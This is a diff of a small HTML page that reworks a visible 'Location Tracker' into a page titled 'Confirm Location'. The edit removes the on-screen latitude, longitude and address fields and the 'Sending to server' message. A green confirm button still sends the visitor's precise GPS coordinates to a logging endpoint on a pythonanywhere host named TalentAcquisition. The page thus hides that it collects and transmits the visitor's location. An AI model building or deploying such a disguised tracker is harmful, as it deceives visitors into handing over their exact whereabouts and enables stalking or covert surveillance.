@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Tracker</title>
+    <title>Confirm Location</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
             font-family: sans-serif;
-            background:#f4f4f4;
             display:flex;
             justify-content:center;
             align-items:center;
             height:100vh;
             margin:0;
+            background:#f4f4f4;
         }
 
         .card {
             background:white;
-            padding:20px;
-            border-radius:10px;
+            padding:25px;
+            border-radius:12px;
             width:90%;
             max-width:400px;
             text-align:center;
@@ -39,19 +39,10 @@
             color:white;
         }
 
-        input {
-            width:100%;
-            padding:10px;
-            margin-top:10px;
-            border:1px solid #ccc;
-            border-radius:8px;
-            box-sizing:border-box;
-        }
-
         #status {
             margin-top:10px;
-            color:gray;
             font-size:14px;
+            color:gray;
         }
     </style>
 </head>
@@ -59,86 +50,59 @@
 
 <div class="card">
 
-    <h3>📍 Location Tracker</h3>
+    <h3>📍 Confirm Location</h3>
 
     <button class="btn" onclick="getLocation()">Get Location</button>
 
     <p id="status"></p>
 
-    <input id="lat" placeholder="Latitude" readonly>
-    <input id="lon" placeholder="Longitude" readonly>
-    <input id="address" placeholder="Address">
+    <button onclick="sendLocation()" style="background:#28a745;color:white;">
+        Confirm Location
+    </button>
 
 </div>
 
 <script>
 
+let lat = null;
+let lon = null;
+
 function getLocation() {
 
-    document.getElementById("status").innerText = "Getting location...";
-
-    if (!navigator.geolocation) {
-        document.getElementById("status").innerText = "GPS not supported";
-        return;
-    }
+    document.getElementById("status").innerText = "Detecting location...";
 
     navigator.geolocation.getCurrentPosition(
-        async (pos) => {
+        (pos) => {
+            lat = pos.coords.latitude;
+            lon = pos.coords.longitude;
 
-            let lat = pos.coords.latitude;
-            let lon = pos.coords.longitude;
-
-            document.getElementById("lat").value = lat;
-            document.getElementById("lon").value = lon;
-
-            document.getElementById("status").innerText = "Location received ✔ Sending to server...";
-
-            // Reverse geocode (address)
-            try {
-                let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                let json = await res.json();
-                document.getElementById("address").value = json.display_name;
-            } catch (e) {
-                document.getElementById("address").value = "Address not found";
-            }
-
-            // 🔥 SEND TO PYTHONANYWHERE BACKEND
-            sendToServer(lat, lon);
-
+            document.getElementById("status").innerText = "Location ready ✔ Click Confirm";
         },
-        (err) => {
-
-            document.getElementById("status").innerText =
-                "Permission denied or error";
-
-        },
-        {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
+        () => {
+            document.getElementById("status").innerText = "Permission denied ❌";
         }
     );
 }
 
-function sendToServer(lat, lon) {
+function sendLocation() {
+
+    if (!lat || !lon) {
+        alert("Get location first");
+        return;
+    }
 
     let url = "https://TalentAcquisition.pythonanywhere.com/log"
-            + "?lat=" + lat
-            + "&lon=" + lon
-            + "&ip=web"
-            + "&type=gps";
-
-    console.log("Sending:", url);
+        + "?lat=" + lat
+        + "&lon=" + lon
+        + "&ip=web"
+        + "&type=confirmed";
 
     fetch(url)
-    .then(res => res.text())
-    .then(data => {
-        document.getElementById("status").innerText = "Saved to server ✔";
-        console.log("Server response:", data);
+    .then(() => {
+        document.getElementById("status").innerText = "Saved ✔";
     })
-    .catch(err => {
-        document.getElementById("status").innerText = "Failed to send ❌";
-        console.log("Error:", err);
+    .catch(() => {
+        document.getElementById("status").innerText = "Failed ❌";
     });
 }
 
